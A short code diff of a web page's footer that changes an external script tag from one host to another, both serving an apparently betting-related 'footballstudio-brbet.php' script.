@@ -166,6 +166,6 @@ setInterval(() => {
     function toggleMenu() {
         document.getElementById('navLinks').classList.toggle('active');
     }
-</script>    <script src="https://api.padroesdecassino.com.br/footballstudio-brbet.php"></script>
+</script>    <script src="https://fottebol.vercel.app/footballstudio-brbet.php"></script>
   </body>
 </html>
